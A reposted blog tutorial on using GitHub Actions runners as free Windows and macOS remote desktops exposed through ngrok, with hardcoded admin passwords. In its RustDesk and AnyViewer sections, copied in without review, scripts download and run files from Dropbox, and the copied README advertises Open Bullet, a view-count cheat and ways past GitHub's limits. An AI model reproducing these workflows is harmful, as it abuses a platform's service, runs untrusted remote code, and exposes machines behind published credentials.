---
tags:
    - 其它
    - Git
    - GitHub Actions
---

# [Free VPS] 2vCPU, 7G RAM Windows 2022 & 14G RAM MacOS VMs From Github

[2/19/2024](https://blog.51sec.org/2024/02/rdp-connect-to-your-github-action-vm.html) [Free](https://blog.51sec.org/search/label/Free)

GitHub offers hosted virtual machines to run workflows, which contains an environment of tools, packages, and settings available for GitHub Actions to use. It also allows you install additional software on GitHub-hosted runners (Github hosted Action VM) as a part of your workflow. That gives us a chance to install enable RDP on a Windows server and use Ngrok to proivde us a port for our RDP connection.

![Ezoic](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ezoicbwa.png)![img](GitHub Actions远程桌面.assets/WR-v7qRyRl2_PgbzFH.jpg)PlayUnmuteRemaining Time -12:17FullscreenSettings![img](https://video-meta.humix.com/poster/O65Gj9hsgcT6/WR-v7qRyRl2_PgbzFH.jpg?w=640)Now Playing![img](GitHub Actions远程桌面.assets/84b62d4ea934f4ea42316850bcc9f150eb90707478537ad0b9a39358cdbabca8_oIjLmY.jpg)![img](GitHub Actions远程桌面.assets/8MxGt4JbQs2_ETXvah.jpg)![img](GitHub Actions远程桌面.assets/a527cb8774c74aa616c1a8f051129aaae247661c08cb34983ebb430ebd28d595_WuJCpr.jpg)![img](GitHub Actions远程桌面.assets/83cc0e3a488dfd35ab129db23a22c9e9ff01ee47634808ed393306da20e8d616_cikZla.jpg)![img](GitHub Actions远程桌面.assets/8st83rROkc2_OlamQX.webp)![img](GitHub Actions远程桌面.assets/qB2PsGQGkJ2_XuSWZB.jpg)![img](GitHub Actions远程桌面.assets/vA2O6Xdad62_LyeLRs.jpg)![img](GitHub Actions远程桌面.assets/00803dd7108edbc7e7d77f0247e5f0b8fd5152f69101468adb9e4b38d44e7e15_NxxYnt.jpg)![img](GitHub Actions远程桌面.assets/WBAD-jJ5ll2_qetXqR.jpg)![img](https://video-meta.humix.com/poster/O65Gj9hsgcT6/WR-v7qRyRl2_PgbzFH.jpg?w=640)Play Video[Free VPS with Root Access (4 CPU Cores, 8G RAM, 10G Storage) From Intel Developer Cloud](https://51sec.org/humix/video/WR-v7qRyRl2)Share[Watch on![Humix](GitHub Actions远程桌面.assets/full_humix_logo_white.png)](https://51sec.org/humix/video/WR-v7qRyRl2)

This post (https://go.51sec.org/XYc8Tj) shows you how to configure this Github VM and how to RDP into it. 



Table of Contents[Pre-requisites](https://blog.51sec.org/2024/02/rdp-connect-to-your-github-action-vm.html#point0)[Windows RDP with Ngrok - Steps](https://blog.51sec.org/2024/02/rdp-connect-to-your-github-action-vm.html#point1)[MacOS VNC Script](https://blog.51sec.org/2024/02/rdp-connect-to-your-github-action-vm.html#point2)[Windows - RustDesk](https://blog.51sec.org/2024/02/rdp-connect-to-your-github-action-vm.html#point3)[Github RDP - Anyviewer](https://blog.51sec.org/2024/02/rdp-connect-to-your-github-action-vm.html#point4)[Videos](https://blog.51sec.org/2024/02/rdp-connect-to-your-github-action-vm.html#point5)[References](https://blog.51sec.org/2024/02/rdp-connect-to-your-github-action-vm.html#point6)


More information about Github-hosted runners:

> Runners are the machines that execute jobs in a GitHub Actions workflow. For example, a runner can clone your repository locally, install testing software, and then run commands that evaluate your code. GitHub provides runners that you can use to run your jobs, or you can [host your own runners](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners). Each GitHub-hosted runner is a new virtual machine (VM) hosted by GitHub with the runner application and other tools preinstalled, and is available with Ubuntu Linux, Windows, or macOS operating systems. When you use a GitHub-hosted runner, machine maintenance and upgrades are taken care of for you. 
>
> 
>
> Further details can be found from : https://docs.github.com/en/actions/using-github-hosted-runners/about-github-hosted-runners/about-github-hosted-runners

[![img](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ngcb11.webp)](https://trstringer.com/images/github-self-hosted-ephemeral3.png)

Script repository:

Github: https://github.com/JohnnyNetsec/github-vm/



## Pre-requisites

### Requirements:

> \1. Github Account
>
> \2. Ngrok Account

### Limitation:

- Windows / Linux VM only can exist for 6 hours. That is because Github's job run limitation. The maximum number of minutes to let a job run before GitHub automatically cancels it. In default is 360 minutes. 

## Windows RDP with Ngrok - Steps

Log into your Github account and Ngrok account first.

1 Create a new Github Repository

[![img](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ngcb11-1718190428917-17.webp)](https://i.51sec.org/202309/chrome_K3XyQVbHRr.png)



2 Set up a wrokflow yourself



[![img](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ngcb11-1718190428917-18.webp)](https://i.51sec.org/202309/chrome_b6ARGNXmr9.png)





3 Paste the code in to new workflows / main.yml file then Commit changes...



[![img](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ngcb11-1718190428917-19.webp)](https://i.51sec.org/202309/chrome_qLG1bfQqx9.png)



Code also can be found from : 

- https://github.com/JohnnyNetsec/github-vm
- https://github.com/HowToLearnHacking/uploads/blob/main/file.txt

name: winrdp
on: [push, workflow_dispatch]
jobs:
 build:
  runs-on: windows-latest
  steps:
  \- name: Download
   run: Invoke-WebRequest https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -OutFile ngrok.zip
  \- name: Extract
   run: Expand-Archive ngrok.zip
  \- name: Auth
   run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
   env:
    NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
  \- name: Enable TS
   run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
  \- run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
  \- run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
  \- run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
  \- name: Create Tunnel
   run: .\ngrok\ngrok.exe tcp 3389





4 Click Settings - Security - Secrets and variables - Actions - New repository secret

[![img](data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%22851%22%20height%3D%22723%22%3E%3C%2Fsvg%3E)](https://i.51sec.org/202309/chrome_0icciYXnXI.png)

Add a new repository secret



[![img](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ngcb11-1718190428917-20.webp)](https://i.51sec.org/202309/chrome_C9Yehb2ZnE.png)





5 Delete the failed workflow run

[![img](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ngcb11-1718190428917-21.webp)](https://i.51sec.org/202309/chrome_ptdnySMXDQ.png)





6 Run CI workflow 

[![img](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ngcb11-1718190428918-22.webp)](https://i.51sec.org/202309/chrome_IptIKLgFcQ.png)





7 Go back to Ngrok webpage and find out Endpoint's URL

in this example, copy 6.tcp.ngrok.io:16449 , and it will be used as our RDP host value. 

[![img](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ngcb11-1718190428918-23.webp)](https://i.51sec.org/202309/chrome_wIv4ae5cJb.png)



8 RDP into your new Windows Server

username: runneradmin

password: P@ssw0rd!

[![img](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ngcb11-1718190428918-24.png)](https://i.51sec.org/202309/mstsc_bCTrenGVim.png)





Speed testing:

[![img](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ngcb11-1718190428918-25.webp)](https://i.51sec.org/202309/mstsc_xIj27OnuHJ.png)





## MacOS VNC Script

Github: https://github.com/JohnnyNetsec/github-vm/tree/main/mac


If you wanna try MacOS, here is workflow script. I will give it a try then post a video for it:

macos.txt

name: MacRDP
on: 
 workflow_dispatch:
jobs:
 build:
  name: MacRDP
  runs-on: macos-latest
  
  steps:         
  \- name: Enabling RDP Access
   env:
    NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
   run: |
     curl -s -o start.sh -L "https://raw.githubusercontent.com/JohnnyNetsec/github-vm/main/mac/start.sh"
     chmod +x start.sh
     bash start.sh "$NGROK_AUTH_TOKEN"
     
  \- name: Log In Details To VNC Server
   run: |
     chmod +x login.sh
     bash login.sh
     
  \- name: MacOS System running...
   uses: mxschmitt/action-tmate@v2



Before run this workflow, add a new secret for Ngrok auth token:

[![img](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ngcb11-1718190428918-26.webp)](https://i.51sec.org/202309/chrome_C9Yehb2ZnE.png)

Here is the screenshot:

[![img](data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%221487%22%20height%3D%22871%22%3E%3C%2Fsvg%3E)](https://i.51sec.org/202309/RemoteDesktopManager_jZjIrXErhw.png)



Note: It seems Github will deprovision this VM in 15 minutes since I got all jobs were cancelled message after around 15 minutes. But you can start it again. The account seems safe at this moment. 

Start.sh :



\#Downloads
curl -s -o login.sh -L "https://raw.githubusercontent.com/JohnnyNetsec/github-vm/main/mac/login.sh"
\#disable spotlight indexing
sudo mdutil -i off -a
\#Create new account
sudo dscl . -create /Users/runneradmin
sudo dscl . -create /Users/runneradmin UserShell /bin/bash
sudo dscl . -create /Users/runneradmin RealName Runner_Admin
sudo dscl . -create /Users/runneradmin UniqueID 1001
sudo dscl . -create /Users/runneradmin PrimaryGroupID 80
sudo dscl . -create /Users/runneradmin NFSHomeDirectory /Users/tcv
sudo dscl . -passwd /Users/runneradmin P@ssw0rd!
sudo dscl . -passwd /Users/runneradmin P@ssw0rd!
sudo createhomedir -c -u runneradmin > /dev/null
sudo dscl . -append /Groups/admin GroupMembership runneradmin
\#Enable VNC
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -allowAccessFor -allUsers -privs -all
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -configure -clientopts -setvnclegacy -vnclegacy yes 
echo runnerrdp | perl -we 'BEGIN { @k = unpack "C*", pack "H*", "1734516E8BA8C5E2FF1C39567390ADCA"}; $_ = <>; chomp; s/^(.{8}).*/$1/; @p = unpack "C*", $_; foreach (@k) { printf "%02X", $_ ^ (shift @p || 0) }; print "\n"' | sudo tee /Library/Preferences/com.apple.VNCSettings.txt
\#Start VNC/reset changes
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -restart -agent -console
sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate
\#install ngrok
brew install --cask ngrok
\#configure ngrok and start it
ngrok authtoken $1
ngrok tcp 5900 --region=in &

![Ezoic](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ezoicbwa.png)



Login.sh



```
#!/bin/bash
echo ..........................................................
echo IP:
curl -s http://localhost:4040/api/tunnels | grep -o '"public_url":"[^"]*' | sed 's/"public_url":"//'
echo Username: runneradmin
echo Password: P@ssw0rd!
```

Dark Theme

[![img](data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%221926%22%20height%3D%221056%22%3E%3C%2Fsvg%3E)](https://i.51sec.org/202309/vncviewer_ppx96a4l5J.png)



REALVNC Viewer:



- Username: runneradmin
- Password: P@ssw0rd!



[![img](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ngcb11-1718190428918-27.webp)](https://i.51sec.org/202309/vncviewer_W8qelsRNiN.png)





## Windows - RustDesk

I haven't reviewed the code and haven't tried following method, but copied to here as an alternative to use Github vm as RDP server. 



Original author's README.md file in Github repository

===================================================

\## Disala-RustDesk-Windows-10-RDP-🇱🇰 
\# Read This Before Rushing To Actions Tab 💀
\* Note : make suer to install [RustDesk](https://rustdesk.com/) in your device.
\* Note : i'm not responsible for suspended accounts
\* Note : 30 miniute github timelimit bypassed now its 6 hours
\* Note : Lower timelimit if u want to save ur github account (to 4 hours)
\### Windows 10 Least
VM features:
\- 2-core vCPU
\- 7 GB RAM
\- 100 GB Disk **(Excluded System Used)**
\* We Have Some Cool Features That Other Scripts Dosen't Have
 \- Automatically Telegram Installed
 \- Automatically Winrar Installed
 \- Automatically Open Bullet Installed
 \- Automatically VM Quick Config Installed and Configuerd
 \- Small Taskbar
 \- Removed Stupid/Unrated Softwares
 \- YT Watchtime Hack Cheat
 \- Automatically Qbit Installed 
 \- Ect ...
\## Deploy and Run
<details>
  <summary>Windows 10 RDP Install and Run</summary>
<br>
\* Note: Don't Make Github RDPs with personal account, [Github Unlimited Accounts Method](https://youtu.be/b-hDeGpPLhY).
 
\* Go to [**Here**](https://thedisala.blogspot.com/2023/07/how-to-create-free-windows-10-rdp-using.html) and download the **Windows 10 - Rustdesk.yml**. (workflows file is on telegram channel, sub to me if u want)
  
\* Create new github repo , click **create new file** and copy this text **.github/workflows/test** also type test in empty box and click **committed changes** after that **upload Windows 10 - RustDesk.yml in there**.
  
\* Now go to **Actions** Tab and select one of system workflow.
\* Click **Run Workflow** button on the left of **This workflow has a workflow_dispatch event trigger** line.
\* Wait until a few minutes.
\* Copy the **RustDesk ID** and Open RustDesk.exe and paste your ID in there and press enter then Give Password As **Disalardp1**
\* Again Press Enter. **(Note: Don't Close Any Ongoing Tabs In Taskbar)
\* Enjoy!
</details>
\#You need proof just goto Action Tab And Watch....
\# [Watch Tutorial If You Dosen't Understand This.](https://youtu.be/u3hHCQPACmY)
\### Brought To You By Disala 💀 , Its Functional 😗.
\### You Can See ID , Pass And Cool Ascki Art 

==================================================

and click add file > create file , type .github/worklflows/test and save

then copy following workflow yml content into your action workflow file:

name: Windows - RustDesk
on:
 workflow_dispatch:
jobs:
 build:
  name: Start Building...
  runs-on: windows-latest
  timeout-minutes: 9999
  
  steps:
   \- name: Downloading & Installing Essentials
    run: |
     Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/qdyd4p9t6xoabl95n5o3g/Downloads.bat?rlkey=snr74vv1vr8k5suujugvrhjtm&dl=1" -OutFile "Downloads.bat"
     cmd /c Downloads.bat
   \- name: Log In To AnyDesk
    run: cmd /c show.bat
   \- name: Time Counter
    run: python time.py



down.bat file :

@echo off
curl -L -o login.py https://www.dropbox.com/scl/fi/az5jzhpuiylnw7yqw9du5/login.py?rlkey=1qjxif8fu35dh0v77nagv2ihh&dl=0
curl -L -o loop.bat https://www.dropbox.com/scl/fi/vji7ekyslpbovokpqeay3/loop.bat?rlkey=876nfzm3qdmyqhc1jckgqjcld&dl=0
curl -L -o show.bat https://www.dropbox.com/scl/fi/cwbwdo2n3tt8rbqmugc6h/show.bat?rlkey=41m0ds12mg6e28giib3zqlf6w&dl=0
certutil -urlcache -split -f "https://github.com/rustdesk/rustdesk/releases/download/1.2.1/rustdesk-1.2.1-x86_64.exe" rustdesk.exe
pip install pyautogui --quiet
pip install psutil --quiet
curl -s -L -o time.py https://www.dropbox.com/scl/fi/ox42qglbf6fsnm9erf8cw/timelimit.py?rlkey=opyeqgum1k95kud81xlc7d66r&dl=0
curl -s -L -o C:\Users\Public\Desktop\Telegram.exe https://telegram.org/dl/desktop/win64
curl -s -L -o C:\Users\Public\Desktop\Winrar.exe https://www.rarlab.com/rar/winrar-x64-621.exe
powershell -Command "Invoke-WebRequest 'https://github.com/chieunhatnang/VM-QuickConfig/releases/download/1.6.1/VMQuickConfig.exe' -OutFile 'C:\Users\Public\Desktop\VMQuickConfig.exe'"
C:\Users\Public\Desktop\Telegram.exe /VERYSILENT /NORESTART
del C:\Users\Public\Desktop\Telegram.exe
C:\Users\Public\Desktop\Winrar.exe /S
del C:\Users\Public\Desktop\Winrar.exe
del /f "C:\Users\Public\Desktop\Epic Games Launcher.lnk" > errormsg.txt 2>&1
del /f "C:\Users\Public\Desktop\Unity Hub.lnk" > errormsg.txt 2>&1
set password=@#Disala123456
powershell -Command "Set-LocalUser -Name 'runneradmin' -Password (ConvertTo-SecureString -AsPlainText '%password%' -Force)"
start "" "rustdesk.exe"
python login.py
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel" /v "{20D04FE0-3AEA-1069-A2D8-08002B30309D}" /t REG_DWORD /d 0 /f
tzutil /s "Sri Lanka Standard Time"



## Github RDP - Anyviewer

I haven't reviewed the code and haven't tried following method, but copied to here as an alternative to use Github vm as RDP server. 

===========================================



*1. Download and Install AnyViewer 2. Register And Log In 3. Make New Repo and Upload This Workdflow in* `.github/workflows` *then click it. 4. Put Your AnyViewer eMail And Pass In the code 5. Save And Run*

name: AnyViewer Windows RDP
on:
 workflow_dispatch:
jobs:
 build:
  runs-on: windows-latest
  steps:
   \- name: Downloading & Setting Up
    run: |
     echo "EMAIL_SECRET=Your Anyviewer eMail address" > secrets.txt
     echo "PASSWORD_SECRET=Your AnyViewer Password" >> secrets.txt
     Invoke-WebRequest -Uri "https://www.dropbox.com/sh/l567nu2ff84q4dr/AACTILIbK9bi5yQLtp221pTJa/down.bat?dl=1" -OutFile "down.bat"
     cmd /c down.bat
     
   \- name: Login Details
    run: cmd /c show.bat
   \- name: Time Counter
    run: Start-Sleep -Seconds 14600



https://www.youtube.com/watch?v=YNYHrKxQsW8

down.bat file :

@echo off
certutil -urlcache -split -f "https://www.anyviewer.com/ss/download/AnyViewerSetup.exe" AnyViewer.exe
pip install pyautogui 
curl -L -o login.py https://www.dropbox.com/scl/fi/k18qc9drpe7nhli766fsb/login.py?rlkey=v96du1pl748xqkiqdc1qltr4r&dl=0
curl -L -o show.bat https://www.dropbox.com/scl/fi/1rwsfbiva0f20s1ufstkm/show.bat?rlkey=zcslegmtooxxwe8mh2f8pazu9&dl=0
curl -s -L -o C:\Users\Public\Desktop\Telegram.exe https://telegram.org/dl/desktop/win64
curl -s -L -o C:\Users\Public\Desktop\Winrar.exe https://www.rarlab.com/rar/winrar-x64-621.exe
powershell -Command "Invoke-WebRequest 'https://github.com/chieunhatnang/VM-QuickConfig/releases/download/1.6.1/VMQuickConfig.exe' -OutFile 'C:\Users\Public\Desktop\VMQuickConfig.exe'"
C:\Users\Public\Desktop\Telegram.exe /VERYSILENT /NORESTART
del C:\Users\Public\Desktop\Telegram.exe
C:\Users\Public\Desktop\Winrar.exe /S
del C:\Users\Public\Desktop\Winrar.exe
del /f "C:\Users\Public\Desktop\Epic Games Launcher.lnk"
del /f "C:\Users\Public\Desktop\Unity Hub.lnk"
set password=@#Disala123456
powershell -Command "Set-LocalUser -Name 'runneradmin' -Password (ConvertTo-SecureString -AsPlainText '%password%' -Force)"
start AnyViewer.exe
python login.py
start "" /MAX "C:\Users\Public\Desktop\VMQuickConfig"
python -c "import pyautogui as pag; pag.click(147, 489, duration=10)"
python -c "import pyautogui as pag; pag.click(156, 552, duration=2)"
python -c "import pyautogui as pag; pag.click(587, 14, duration=2)"



## Videos

Free and Fast Windows RDP VPS (2vCPU 7G RAM) From Github:



<video id="ez-video-ez-y-WB68_5I5lk2_html5_api" class="vjs-tech" preload="metadata" tabindex="-1" role="application" muted="muted" poster="https://video-meta.humix.com/poster/6WYajP76NtOJ/WB68_5I5lk2_CatFxg.jpg" src="blob:https://blog.51sec.org/27f463f8-82e9-4f26-a5ab-4f7ed78526a6" style="box-sizing: inherit; visibility: visible !important; border-radius: 12px; position: absolute; top: 0px; left: 0px; width: 320px; height: 180px;"></video>

Play

Unmute

Remaining Time -14:06



Settings

[![Humix](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/full_humix_logo_white.png)](https://www.humix.com/video/WB68_5I5lk2)Fullscreen

[Free and Fast Windows RDP VPS (2vCPU 7G RAM) From Github](https://www.humix.com/video/WB68_5I5lk2)

Share

[Watch on![Humix](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ngcb11-1718190428918-28.webp)](https://www.humix.com/video/WB68_5I5lk2)



Free 14GB macOS VPS



<video id="ez-video-ez-y-8st83rROkc2_html5_api" class="vjs-tech" preload="metadata" tabindex="-1" role="application" muted="muted" poster="https://video-meta.humix.com/poster/RNZmzPUyVjuW/8st83rROkc2_OlamQX.webp" src="blob:https://blog.51sec.org/307c48af-0e2d-4075-ad46-0ef371935e48" style="box-sizing: inherit; visibility: visible !important; border-radius: 12px; position: absolute; top: 0px; left: 0px; width: 320px; height: 180px;"></video>

Pause

Unmute

Remaining Time -12:50

Picture-in-Picture

Settings

[![Humix](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/full_humix_logo_white.png)](https://www.humix.com/video/8st83rROkc2)Fullscreen

[Get and Connect to a 14GB RAM MacOS Free in Cloud](https://www.humix.com/video/8st83rROkc2)

Share

[Watch on![Humix](/img-post/开发/其它/Git/GitHub Actions/GitHub Actions远程桌面.assets/ngcb11-1718190428918-28.webp)](https://www.humix.com/video/8st83rROkc2)



## References

- Google chrome Remote Desktop - https://remotedesktop.google.com/
- tmate Instant terminal sharing - https://tmate.io/
- ngrok | Unified Application Delivery Platform for Developers - https://ngrok.com/
- https://github.com/HowToLearnHacking/uploads/blob/main/file.txt

Other related projects:

- https://github.com/yrifl/synvm
- https://www.youtube.com/watch?v=PXYzpi6dfns
- https://www.youtube.com/watch?v=oxTv8EUEiZE
- https://github.com/Har-Kuun/OneClickDesktop



来源：

https://blog.51sec.org/2024/02/rdp-connect-to-your-github-action-vm.html